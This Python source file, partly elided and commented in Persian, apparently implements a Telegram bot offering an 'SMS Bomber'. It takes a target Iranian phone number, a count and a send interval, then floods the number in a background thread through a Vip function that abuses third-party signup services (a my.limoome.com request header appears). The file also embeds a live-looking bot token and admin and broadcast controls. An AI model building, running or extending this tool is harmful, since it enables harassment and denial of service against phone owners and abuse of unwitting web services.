...
# توکن ربات تلگرامی خود را اینجا قرار دهید
BOT_TOKEN = '8342802674:AAGlJUGMZHChIY5VC1n8AjbDD5OGMG8B9ao'  # توکن ربات را جایگزین کنید
OWNER_ID = 6508600903  # آیدی عددی مالک ربات را جایگزین کنید (برای جلوگیری از حذف توسط ادمین‌ها)

bot = telebot.TeleBot(BOT_TOKEN)

# لیست ادمین‌ها (شامل مالک)
admins = [OWNER_ID]

# دیکشنری کاربران (برای ذخیره اطلاعات کاربران)
users = {}  # {user_id: {'username': username, 'first_name': first_name}}

# دیکشنری برای ذخیره وضعیت بمبر هر کاربر (برای stop)
bombing_threads = {}  # {user_id: {'thread': thread, 'stop_flag': False, 'phone': '', 'count': 0, 'speed': 0.1}}
...
def main_menu():
    ...
    markup.add(InlineKeyboardButton("📞 SMS Bomber خفن", callback_data="bomber"))
    markup.add(InlineKeyboardButton("🛠 پشتیبانی", callback_data="support"))
    markup.add(InlineKeyboardButton("👨‍💻 سازنده", callback_data="creator"))
    markup.add(InlineKeyboardButton("📢 کانال‌های اسپانسری", callback_data="channels"))
    return markup

# منوی ادمین
def admin_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(InlineKeyboardButton("➕ افزودن ادمین", callback_data="add_admin"))
    markup.add(InlineKeyboardButton("➖ حذف ادمین", callback_data="remove_admin"))
    markup.add(InlineKeyboardButton("📢 پیام همگانی", callback_data="broadcast"))
    markup.add(InlineKeyboardButton("📥 بکاپ کاربران", callback_data="backup"))
    markup.add(InlineKeyboardButton("🔙 بازگشت", callback_data="back_main"))
    return markup

# منوی بمبر
def bomber_menu(user_id):
    markup = InlineKeyboardMarkup(row_width=1)
    if user_id in bombing_threads and 'thread' in bombing_threads[user_id] and bombing_threads[user_id]['thread'].is_alive():
        markup.add(InlineKeyboardButton("🛑 متوقف کردن بمبر", callback_data="stop_bomber"))
    markup.add(InlineKeyboardButton("🔙 بازگشت", callback_data="back_main"))
    return markup
...
def start(message):
    ...
    bot.send_message(message.chat.id, "سلام! به ربات SMS Bomber خوش آمدید.", reply_markup=main_menu())
...
def callback_handler(call):
    if call.data == "bomber":
        ...
        bot.send_message(call.message.chat.id, "شماره تلفن را وارد کنید (فرمت: 09xxxxxxxxx):")
        bot.register_next_step_handler(call.message, get_phone)
    elif call.data == "support":
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, "برای پشتیبانی به @Monibyousefi پیام دهید. 🔙", reply_markup=main_menu())
    elif call.data == "creator":
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, "سازنده: @AnishtayiN 🔙", reply_markup=main_menu())
    elif call.data == "channels":
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, "کانال‌های اسپانسری:\n@golden_market7\n@Sourse_code 🔙", reply_markup=main_menu())
    elif call.data == "add_admin":
        if call.from_user.id in admins:
            bot.answer_callback_query(call.id)
            bot.send_message(call.message.chat.id, "آیدی عددی ادمین جدید را وارد کنید:")
            bot.register_next_step_handler(call.message, add_admin_step)
    elif call.data == "remove_admin":
        if call.from_user.id in admins:
            bot.answer_callback_query(call.id)
            bot.send_message(call.message.chat.id, "آیدی عددی ادمینی که می‌خواهید حذف کنید وارد کنید:")
            bot.register_next_step_handler(call.message, remove_admin_step)
    elif call.data == "broadcast":
        if call.from_user.id in admins:
            bot.answer_callback_query(call.id)
            bot.send_message(call.message.chat.id, "پیام همگانی را وارد کنید:")
            bot.register_next_step_handler(call.message, broadcast_step)
    elif call.data == "backup":
        if call.from_user.id in admins:
            bot.answer_callback_query(call.id)
            backup_users(call.message.chat.id)
    elif call.data == "back_main":
        bot.answer_callback_query(call.id)
        bot.edit_message_text("منوی اصلی:", call.message.chat.id, call.message.message_id, reply_markup=main_menu())
    elif call.data == "stop_bomber":
        bot.answer_callback_query(call.id)
        stop_bomber(call.from_user.id, call.message.chat.id)

# گام دریافت شماره تلفن
def get_phone(message):
    phone = message.text.strip()
    if re.match(r'^09\d{9}$', phone):
        bombing_threads[message.from_user.id] = {'phone': '+98' + phone[1:], 'stop_flag': False}
        bot.send_message(message.chat.id, "تعداد ارسال‌ها را وارد کنید:")
        bot.register_next_step_handler(message, get_count)
    else:
        bot.send_message(message.chat.id, "فرمت اشتباه! دوباره امتحان کنید (09xxxxxxxxx).", reply_markup=main_menu())

# گام دریافت تعداد
def get_count(message):
    try:
        count = int(message.text)
        bombing_threads[message.from_user.id]['count'] = count
        bot.send_message(message.chat.id, "سرعت ارسال (ثانیه بین هر ارسال، مثلا 0.1):")
        bot.register_next_step_handler(message, get_speed)
    except ValueError:
        bot.send_message(message.chat.id, "عدد معتبر وارد کنید!", reply_markup=main_menu())
...
def get_speed(message):
    try:
        ...
        bombing_threads[user_id]['speed'] = speed
        bot.send_message(message.chat.id, "بمبر شروع شد! برای متوقف کردن از دکمه استفاده کنید.", reply_markup=bomber_menu(user_id))
        
        # شروع ترد بمبر
        thread = threading.Thread(target=run_bomber, args=(user_id,))
        bombing_threads[user_id]['thread'] = thread
        thread.start()
    except ValueError:
        bot.send_message(message.chat.id, "عدد معتبر وارد کنید!", reply_markup=main_menu())

# تابع اجرای بمبر (از کد ارائه شده استفاده شده)
def run_bomber(user_id):
    data = bombing_threads[user_id]
    phone = data['phone']
    count = data['count']
    speed = data['speed']
    stop_flag = lambda: bombing_threads[user_id]['stop_flag']
    
    for _ in range(count):
        if stop_flag():
            break
        # فراخوانی تابع Vip از کد بمبر
        Vip(phone, speed)
    
    if not stop_flag():
        bot.send_message(user_id, "بمبر تمام شد!", reply_markup=main_menu())
    else:
        bot.send_message(user_id, "بمبر متوقف شد!", reply_markup=main_menu())
    del bombing_threads[user_id]

# تابع متوقف کردن
def stop_bomber(user_id, chat_id):
    if user_id in bombing_threads:
        bombing_threads[user_id]['stop_flag'] = True
        bot.send_message(chat_id, "در حال متوقف کردن...")
...
def add_admin_step(message):
    try:
        ...
        if new_admin not in admins:
            ...
            bot.send_message(message.chat.id, "ادمین اضافه شد!", reply_markup=admin_menu())
        else:
            bot.send_message(message.chat.id, "قبلا ادمین است!", reply_markup=admin_menu())
    except ValueError:
        bot.send_message(message.chat.id, "آیدی عددی وارد کنید!", reply_markup=admin_menu())
...
def remove_admin_step(message):
    try:
        ...
        if rem_admin == OWNER_ID:
            bot.send_message(message.chat.id, "نمی‌توانید مالک را حذف کنید!", reply_markup=admin_menu())
        elif rem_admin in admins:
            admins.remove(rem_admin)
            bot.send_message(message.chat.id, "ادمین حذف شد!", reply_markup=admin_menu())
        else:
            bot.send_message(message.chat.id, "ادمین نیست!", reply_markup=admin_menu())
    except ValueError:
        bot.send_message(message.chat.id, "آیدی عددی وارد کنید!", reply_markup=admin_menu())
...
# بکاپ کاربران
def backup_users(chat_id):
    filename = f"users_backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    with open(filename, 'w', encoding='utf-8') as f:
        for user_id, info in users.items():
            f.write(f"ID: {user_id}, Username: {info['username']}, Name: {info['first_name']}\n")
    bot.send_document(chat_id, open(filename, 'rb'), reply_markup=admin_menu())
    os.remove(filename)

# کد بمبر کامل (از پیام اولیه کاربر کپی شده)
r='\033[1;31m'
g='\033[32;1m' 
y='\033[1;33m'
w='\033[1;37m'
...
'Connection': 'keep-alive',
'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
'Cookie': 'sess=00da3860-929a-915a- basalm-modal=1',
'Host': 'my.limoome.com',
